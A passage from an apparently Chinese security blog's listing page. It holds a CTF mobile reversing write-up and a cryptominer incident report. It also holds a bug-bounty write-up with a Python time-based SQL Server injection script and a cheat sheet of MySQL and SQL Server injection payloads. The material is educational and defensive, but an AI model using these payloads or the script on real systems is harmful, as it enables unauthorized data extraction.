<li>域认证方式</li>
<li>域内委派</li>
<li>bypass uac 技巧，方法 ，原理</li>
<li>$IPC连接</li>
<li>wmic用法</li>
<li>psexec用法</li>
<li>黄金票据</li>
<li>白银票据</li>
<li>PTH/PTT</li>
<li>Windows defender安全机制</li>
</ul>
<h3 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><ul>
<li>Tomcat</li>
<li>Springboot</li>
<li>最近曝光有重大影响的漏洞</li>
<li>nmap指纹识别原理及用法</li>
</ul>
<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><ul>
<li>注册场景</li>
<li>登录场景</li>
<li>活动场景</li>
<li>支付场景</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2021/07/03/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="欣海余诚's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/07/03/hello-world/" itemprop="url">Hello World</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-07-03T23:42:56+08:00">
                2021-07-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>习惯成自然</p>
<p>Habit is secone nature.</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2020/11/01/ctf-mobile-writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="欣海余诚's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/11/01/ctf-mobile-writeup/" itemprop="url">一道入门mobile题writeup</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-01T20:39:48+08:00">
                2020-11-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index">
                    <span itemprop="name">CTF</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作为一个mobile小白，花了一天时间才做出这道题，踩了很多坑的同时也收获了很多，特此记录一下。</p>
<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>根据弹出的提示，并得到一串字符。</p>
<p><img src="./1.png" alt="image"></p>
<p>附件中是一个apk，打开后只有一个界面。</p>
<p><img src="./2.png" alt="image"></p>
<h2 id="反编译apk"><a href="#反编译apk" class="headerlink" title="反编译apk"></a>反编译apk</h2><p>使用jadx-gui打开apk，看反编译代码：</p>
<p><img src="./3.png" alt="image"></p>
<p>先看入口MainActivity。使用DES解密函数解密一个base64字符串，将结果传入getflag函数（该函数是通过native接口调用的so库中的函数），对比getflag结果和在界面上输入的key值。如果不一致，显示“这是个陷阱，快醒醒！”，如果一致，提示“再使用函数获取 Flag”。</p>
<p>其中DES解密函数在CryptoUtil类：</p>
<p><img src="./4.png" alt="image"></p>
<p>乍一看，需要让这个判断相等，就能得到flag。现在回过头看，这里并没有获取flag的代码，仅仅是弹一个消息框。</p>
<p>apk中还有另外两个资源文件：<code>Addon.jar</code>和<code>libnative.so</code>。前者是MainApplication.java中使用，用于通过字节异或的方式生成CryptoUtil.jar，调用其中的DES解密方法进行解密。后者是通过native接口加载，调用其getflag方法。</p>
<p>对于一个小白来说，每个线索都不想放过，所以我针对Addon.jar一顿研究和操作，最后得到的代码是这样的：</p>
<p><img src="./5.png" alt="image"></p>
<p>WTF??!解密函数直接throw一个异常。上当的我这才发现事情不对，转去研究libnative.so。</p>
<h2 id="逆向so库"><a href="#逆向so库" class="headerlink" title="逆向so库"></a>逆向so库</h2><p>ida打开，定位getFlag函数：</p>
<p><img src="./6.png" alt="image"></p>
<p>大致逻辑为：对一个字符串先进行base64解密，再进行AES解密，返回最后的result。中间穿插着各种无用的代码。。</p>
<p>字符串是已知的，双击texta就能刚看到：</p>
<p><img src="./7.png" alt="image"></p>
<p>接下来解决AES解密。</p>
<h2 id="AES解密"><a href="#AES解密" class="headerlink" title="AES解密"></a>AES解密</h2><p>首先要知道，AES解密需要有密文、密钥、初始向量、密钥长度、填充模式、加密模式。decryptAES256cbc函数已经告诉了密钥长度是256位（32字节）、加密模式cbc。初始向量iv双击也可以看到，仅剩密钥未知。</p>
<p><img src="./8.png" alt="image"></p>
<p>目光聚焦至v7变量。v7调用了GetStringUTFChars函数（该函数声明如下），获取了传入的参数a3的地址。</p>
<p>根据MainActivity中对getflag的调用，传入的参数是一串密文经过base64和DES解密后的值。盲猜这个解密后的密文就是这里的密钥。</p>
<p><img src="./9.png" alt="image"></p>
<p>对MainActivity中的密文进行<code>base64</code>+<code>DES</code>解密，得<code>FebRuAry*29th^TweNty-0ne_hUndrEd</code>，刚好32位。</p>
<p><img src="./10.png" alt="image"></p>
<p>参数齐了，在线AES解密一波，得flag。</p>
<p><img src="./11.png" alt="image"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://www.keylala.cn/aes">AES在线加密</a> </p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#NewStringUTF">Chapter 4: JNI Functions</a> </p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/duanxz/p/3651347.html">Java native关键字</a> </p>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2020/10/16/office-miner-events/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="欣海余诚's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/10/16/office-miner-events/" itemprop="url">办公网挖矿病毒事件调查</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-10-16T10:35:22+08:00">
                2020-10-16
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" itemprop="url" rel="index">
                    <span itemprop="name">应急响应</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h2><p>10月14日上午查看山石网科设备威胁日志时发现，ip为192.168.60.120的主机存在挖矿行为。</p>
<p><img src="1.png" alt="image"></p>
<p>经在微步查询，178.128.242.134为矿池地址，确认为挖矿事件。</p>
<p><img src="2.png" alt="image"></p>
<h2 id="事件调查及处理"><a href="#事件调查及处理" class="headerlink" title="事件调查及处理"></a>事件调查及处理</h2><p>确认为挖矿事件后，安全第一时间联系IT同事定位192.168.60.120地址对应的员工，并封禁该员工的上网权限，联系该同事使用ESET对系统进行全盘杀毒。</p>
<p>据该员工反馈，192.168.60.120是申请用于测试的windows10台式机，为方便外网访问，在该电脑上安装了Zero Tier、花生壳等内网穿透软件，没有开启ESET杀毒软件，于近两日发现电脑运行缓慢。</p>
<p>10月15日，再次查看山石网科设备威胁日志时发现，192.168.60.120仍存在与矿池通信的行为。</p>
<p><img src="3.png" alt="image"></p>
<p>于是安全直接联系该同事，对其电脑进行检查。</p>
<p>根据最早告警时间，定位到病毒运行时间为2020/10/12 02:05左右。搜索该时间段新创建的文件，发现有很多exe文件，经微步和VT扫描有四个文件均为病毒，已用杀毒软件进行隔离或删除。</p>
<p>查看windows系统日志，发现最早于2020/10/12 2:04分，电脑上安装了sqlbrowsers服务并设置为了自启动，对应的服务文件conhost.exe文件即为病毒文件。</p>
<p><img src="4.png" alt="image"></p>
<p>Application日志中存在病毒启动记录：</p>
<p><img src="5.png" alt="image"></p>
<p>查看windows安全日志，发现从2020/10/11 21:03起，有很多Logon登录审核失败的事件，可以看出是攻击者在尝试爆破用户名密码。</p>
<p><img src="6.png" alt="image"></p>
<p><img src="7.png" alt="image"></p>
<p>攻击者最终爆破成功，登录系统种植挖矿病毒。</p>
<p>这里爆破地址是127.0.0.1，原因是花生壳将电脑本地的3389端口转发至了公网，攻击者访问这个公网地址，相当于直接访问到了受害主机上的花生壳客户端，因此登录地址被识别为127.0.0.1。</p>
<h2 id="事件结论"><a href="#事件结论" class="headerlink" title="事件结论"></a>事件结论</h2><p>该员工通过在本机电脑上安装花生壳软件，将本地3389端口转发至花生壳公网地址，导致3389端口可被公网任意访问，最终导致被攻击者爆破口令登入系统，种植了挖矿病毒。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2020/09/22/blindsql-injection-poc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="欣海余诚's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/09/22/blindsql-injection-poc/" itemprop="url">挖洞经历之SQLServer time-based注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-09-22T00:32:13+08:00">
                2020-09-22
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
                    <span itemprop="name">WEB安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>使用xray扫出目标username参数存在sql注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /templates/index/hrlogon.do HTTP/1.1</span><br><span class="line">Host: xxx.com</span><br><span class="line">Content-Length: 84</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://xxx.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://xxx.com/templates/index/hrlogon.jsp</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: appdate=2020.09.21; bosflag=hl; JSESSIONID=13E35873CC53C0B4598A2FD66F8B348C; radius=14.103.218.82; uudid=cms1553b202-f079-153c-38ac-1c3dbb2135c5</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">logon.x=link&amp;username=admin&#x27;;waitfor/**/delay&#x27;0:0:3&amp;password=test&amp;appdate=2020-09-21</span><br></pre></td></tr></table></figure>

<p>尝试payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;;waitfor/**/delay&#x27;0:0:1</span><br><span class="line">admin&#x27;;waitfor/**/delay&#x27;0:0:3</span><br></pre></td></tr></table></figure>
<p>返回的时间明显不一样。</p>
<p>猜测数据库名的长度：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;;if(len(db_name())=4)waitfor/**/delay&#x27;0:0:5&#x27;else/**/waitfor/**/delay&#x27;0:0:2</span><br><span class="line">admin&#x27;;if(len(db_name())=5)waitfor/**/delay&#x27;0:0:5&#x27;else/**/waitfor/**/delay&#x27;0:0:2</span><br><span class="line">admin&#x27;;if(len(db_name())=6)waitfor/**/delay&#x27;0:0:5&#x27;else/**/waitfor/**/delay&#x27;0:0:2</span><br></pre></td></tr></table></figure>
<p>试了多次后基本判定存在注入无疑，并且数据库名长度为5。编写poc脚本，利用二分法猜解。</p>
<p><img src="db_length.jpg" alt="image"></p>
<p><img src="db_name.jpg" alt="image"></p>
<p>poc脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;Origin&#x27;:&#x27;http://xxx.com&#x27;,</span><br><span class="line">    &#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;,</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&#x27;,</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;,</span><br><span class="line">    &#x27;Referer&#x27;: &#x27;http://xxx.com/templates/index/hrlogon.jsp&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = &#x27;http://xxx.com/templates/index/hrlogon.do&#x27;</span><br><span class="line">def getDbLength():</span><br><span class="line">    for i in range(1, 20):</span><br><span class="line">        poc = &quot;admin&#x27;;if(len(db_name())=%d)waitfor/**/delay&#x27;0:0:5&#x27;else/**/waitfor/**/delay&#x27;0:0:2&quot; % (i, )</span><br><span class="line">        data = &quot;logon.x=link&amp;username=%s&amp;password=test&amp;appdate=2020-09-21&quot; % (poc)</span><br><span class="line">        print(i, poc)</span><br><span class="line">        t1 = time.time()</span><br><span class="line">        r = requests.post(url, headers=headers, data=data)</span><br><span class="line">        t2 = time.time()</span><br><span class="line">        if t2-t1 &gt;= 5:</span><br><span class="line">            print(&#x27;The db length is: &#x27;, i)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">def check(data):</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    r = requests.post(url, headers=headers, data=data)</span><br><span class="line">    t2 = time.time()</span><br><span class="line">    if t2 - t1 &gt;= 3:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def getDbName():</span><br><span class="line">    length = 5 #getDbLength()</span><br><span class="line">    db_name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, length + 1):</span><br><span class="line">        _min, _max = 0, 140</span><br><span class="line">        while _min &lt;= _max:</span><br><span class="line">            middle = int((_min + _max) / 2)</span><br><span class="line">            poc1 = &quot;admin&#x27;;if(ascii(substring((db_name()),%d,1))=%d)waitfor/**/delay&#x27;0:0:3&#x27;/**/else waitfor/**/delay&#x27;0:0:1&quot; % (</span><br><span class="line">            i, middle)</span><br><span class="line">            poc2 = &quot;admin&#x27;;if(ascii(substring((db_name()),%d,1))&gt;%d)waitfor/**/delay&#x27;0:0:3&#x27;/**/else waitfor/**/delay&#x27;0:0:1&quot; % (</span><br><span class="line">            i, middle)</span><br><span class="line">            data1 = &quot;logon.x=link&amp;username=%s&amp;password=test&amp;appdate=2020-09-21&quot; % (poc1,)</span><br><span class="line">            data2 = &quot;logon.x=link&amp;username=%s&amp;password=test&amp;appdate=2020-09-21&quot; % (poc2,)</span><br><span class="line">            if check(data1):  # guess right</span><br><span class="line">                print(chr(middle))</span><br><span class="line">                db_name += chr(middle)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">            if check(data2):</span><br><span class="line">                print(&quot;目标字符 &gt; &quot;, middle)</span><br><span class="line">                _min = middle + 1</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line">                print(&quot;目标字符 &lt; &quot;, middle)</span><br><span class="line">                _max = middle - 1</span><br><span class="line">    print(db_name)</span><br><span class="line">getDbLength()</span><br><span class="line">#getDbName()</span><br></pre></td></tr></table></figure>

<p>提交SRC证明到这里即可~</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://xhycccc.github.io/2020/09/19/sql-manual-injection-referrence/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="欣海余诚's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/09/19/sql-manual-injection-referrence/" itemprop="url">SQL手注参考笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-09-19T14:28:54+08:00">
                2020-09-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
                    <span itemprop="name">WEB安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if语句： if(1=1,1,0)</span><br><span class="line">substr(&quot;abc&quot;, 1, 1) //a</span><br><span class="line">select @@secure_file_priv; //查看文件导出权限</span><br><span class="line">&#x27;/var/lib/mysql-files/&#x27;</span><br><span class="line">select @@plugin_dir; //查看plugin目录</span><br><span class="line">&#x27;/usr/lib64/mysql/plugin/&#x27;</span><br><span class="line">select @@basedir; // 查看数据库目录</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bool型(无空格)</span><br><span class="line">1&#x27;and&#x27;y&#x27;=&#x27;f</span><br><span class="line">1&#x27;and&#x27;y&#x27;=&#x27;y</span><br><span class="line">1&#x27;and ord(mid(user(),1,1))&gt;1 and &#x27;y&#x27;=&#x27;y</span><br><span class="line">搜索型：</span><br><span class="line">%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;</span><br><span class="line">%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;</span><br><span class="line">报错注入</span><br><span class="line">&#x27;and/**/extractvalue(1,concat(char(126),md5(1982470395)))and&#x27;</span><br><span class="line">&#x27;and/**/extractvalue(1,concat(user()))and&#x27;</span><br><span class="line">1&#x27;and/**/updatexml(1,concat(char(126),user()),1)and&#x27;</span><br><span class="line">盲注(无空格)</span><br><span class="line">1&#x27;and(select*from(select+sleep(2))a/**/union/**/select+1)=&#x27;</span><br><span class="line">注数据库长度：</span><br><span class="line">1&#x27;and(select*from(select if(LENGTH(database())=%d,sleep(3),0))a)=&#x27;</span><br><span class="line">注数据库名：</span><br><span class="line">1&#x27;and(select*from(select if(ASCII(SUBSTR(database(),1,1))=97,sleep(3),0))a)=&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>盲注常用函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ascii(str): str是一个字符串参数，返回值为其最左侧字符的ascii码。通过它，我们才能确定特定的字符。</span><br><span class="line"></span><br><span class="line">substr(str,start,len): 这个函数是取str中从下标start开始的，长度为len的字符串。通常在盲注中用于取出单个字符，交给ascii函数来确定其具体的值。。</span><br><span class="line"></span><br><span class="line">MID(str, start [, Length]): 也是截取字符串，只用于mysql。</span><br><span class="line"></span><br><span class="line">length(str): 这个函数是用来获取str的长度的。这样我们才能知道需要通过substr取到哪个下标。</span><br><span class="line"></span><br><span class="line">count([column]): 这个函数大家应该很熟，用来统计记录的数量的，其在盲注中，主要用于判断符合条件的记录的数量，并逐个破解。</span><br><span class="line"></span><br><span class="line">if(condition,a,b): 当condition为true的时候，返回a，当condition为false的时候，返回b。</span><br><span class="line"></span><br><span class="line">ord(&#x27;a&#x27;) 转换为ascii码</span><br><span class="line"></span><br><span class="line">left(str, len) 取str中前len个字符。select LEFT(&#x27;123&#x27;,2)结果为12</span><br><span class="line"></span><br><span class="line">char(114) 数字转换为字符</span><br><span class="line"></span><br><span class="line">regexp &#x27;正则表达式&#x27; 正则表达式匹配 select &#x27;2bc&#x27; REGEXP &#x27;^[a-z]&#x27;</span><br></pre></td></tr></table></figure>


<h1 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><ul>
<li>端口号为 1433</li>
<li>数据库后缀名 .mdf</li>
<li>注释符 –</li>
<li>支持堆叠查询：Y</li>
</ul>
<h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><ul>
<li>sa权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限</li>
<li>db_owner权限：文件管理，数据库操作等权限 users-administrators</li>
<li>public权限：数据库操作 guest-users</li>
</ul>
<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>有6个默认的库，分别是4个系统数据库：</p>
<ul>
<li>master</li>
<li>model</li>
<li>msdb </li>
<li>tempdb</li>
</ul>
<p>和2个其他数据库：</p>
<ul>
<li>ReportServer</li>
<li>ReportServerTempDB。</li>
</ul>
<p>其中，model和tempdb是默认没有数据表的。</p>
<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">select @@version;       #查询数据库的版本</span><br><span class="line">select host_name();     #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字</span><br><span class="line">select db_name();       #查询当前数据库名</span><br><span class="line">select user;            #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner </span><br><span class="line">use tempdb              #切换到tempdb表  </span><br><span class="line">top n                   #查询前n条记录</span><br><span class="line">select substring(&#x27;string&#x27;,2,1)     